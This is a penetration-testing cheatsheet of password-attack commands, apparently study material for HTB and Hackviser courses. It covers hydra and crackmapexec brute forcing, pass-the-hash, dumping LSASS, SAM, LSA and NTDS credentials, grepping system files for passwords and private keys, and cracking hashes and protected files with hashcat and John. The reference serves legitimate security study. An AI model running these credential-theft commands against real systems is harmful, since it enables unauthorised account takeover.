# Password Attacks & Cracking Cheatsheet

Focused password attack and cracking commands aligned with **Hackviser** and **HTB Password Attacks Cheat Sheet**.

---

## Wordlists & Mutations

### Generate wordlist from website
```
cewl https://target.com -d 4 -m 6 --lowercase -w target.wordlist
```

### Rule-based mutation (Hashcat)
```
hashcat --force target.wordlist -r /usr/share/hashcat/rules/best64.rule --stdout > mutated.wordlist
```

### Username generation
```
./username-anarchy -i names.txt > users.txt
```

---

## Remote Password Attacks

### Hydra (generic)
```
hydra -L users.txt -P passwords.txt <service>://<IP>
hydra -l username -P passwords.txt <service>://<IP>
hydra -L users.txt -p Password123 <service>://<IP>
hydra -C userpass.txt <service>://<IP>
```

### CrackMapExec / NetExec
```
crackmapexec smb <IP> -u users.txt -p passwords.txt
crackmapexec winrm <IP> -u users.txt -p passwords.txt
crackmapexec smb <IP> --local-auth -u user -p pass --sam
crackmapexec smb <IP> --local-auth -u user -p pass --lsa
crackmapexec smb <IP> -u user -p pass --ntds
```

### Pass-the-Hash (WinRM)
```
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

---

## Windows Local Credential Extraction

### Dump LSASS
```
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### Parse LSASS dump
```
pypykatz lsa minidump lsass.dmp
```

### Dump SAM locally
```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

```
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

---

## Linux Local Credential Discovery

### Search config files
```
grep -Rni "password" /etc /var 2>/dev/null
```

### Find SSH keys
```
grep -R "PRIVATE KEY" /home /root 2>/dev/null
```

### Browser credentials
```
python3 lazagne.py browsers
python3 firefox_decrypt.py
```

---

## Hash Identification

### hashid
```
hashid hashes.txt
```
### hash-identifier
```
hash-identifier
```
### hashcat
```
hashcat --help | less
hashcat --example-hashes | grep -i -n "<keyword>"
```

### Quick Visual Identification (First Pass)

| Hash prefix / pattern | Likely type |
|----------------------|-------------|
| `$6$` | Linux sha512crypt |
| `$5$` | Linux sha256crypt |
| `$y$` | yescrypt |
| `aad3b435b51404eeaad3b435b51404ee:` | NTLM |
| `md5` + 32 hex | PostgreSQL MD5 |
| `$2a$` / `$2b$` / `$2y$` | bcrypt |
| `$krb5asrep$` | Kerberos AS-REP |
| `$krb5tgs$` | Kerberos TGS |
| `$mysql$` | MySQL |
| `$zip2$` | ZIP |
| `$office$` | MS Office |
| `$pdf$` | PDF |

---

## Cracking with Hashcat

### NTLM
```
hashcat -m 1000 ntlm.txt rockyou.txt
```

### Linux shadow (sha512crypt)
```
hashcat -m 1800 shadow.txt rockyou.txt
```

### MD5 / SHA1 / SHA256 / SHA512
```
hashcat -m 0 md5.txt rockyou.txt
hashcat -m 100 sha1.txt rockyou.txt
hashcat -m 1400 sha256.txt rockyou.txt
hashcat -m 1700 sha512.txt rockyou.txt
```

### Kerberos
```
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### MSSQL
```
hashcat -m 1731 mssql.txt rockyou.txt
```

### MySQL
```
hashcat -m 300 mysql-old.txt rockyou.txt
hashcat -m 7401 mysql-new.txt rockyou.txt
```

### PostgreSQL
```
hashcat -m 112 postgres.txt rockyou.txt
```

### bcrypt
```
hashcat -m 3200 bcrypt.txt rockyou.txt
```

---

## Cracking with John the Ripper

### Auto-detect
```
john hashes.txt --wordlist=rockyou.txt
```

### NTLM
```
john ntlm.txt --format=NT --wordlist=rockyou.txt
```

### Kerberos
```
john asrep.txt --format=krb5asrep --wordlist=rockyou.txt
john kerberoast.txt --format=krb5tgs --wordlist=rockyou.txt
```

### Linux shadow
```
unshadow passwd shadow > unshadowed.txt
john unshadowed.txt --wordlist=rockyou.txt
```

---

## Protected Files

### ZIP
```
zip2john file.zip > zip.hash
john zip.hash --wordlist=rockyou.txt
```

### PDF
```
pdf2john file.pdf > pdf.hash
john pdf.hash --wordlist=rockyou.txt
```

### Office
```
office2john file.docx > office.hash
john office.hash --wordlist=rockyou.txt
```

### SSH private key
```
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt
```

---

## Rules & Masks

### John rules
```
john hashes.txt --wordlist=rockyou.txt --rules
```

### Hashcat rules
```
hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Mask attack
```
hashcat -m 1000 ntlm.txt ?u?l?l?l?l?d?d
```


